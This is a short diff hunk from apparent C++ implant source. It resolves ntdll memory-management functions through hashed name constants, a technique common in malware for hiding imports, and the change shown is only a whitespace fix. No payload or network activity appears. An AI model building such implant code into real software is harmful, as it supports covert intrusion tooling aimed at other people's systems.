@@ -80,7 +80,7 @@ namespace Implant {
             }
         }
 
-        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory ,          Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ;
+        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY)) ;
         x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ;
         x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY)) ;
         x_assertb(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY)) ;
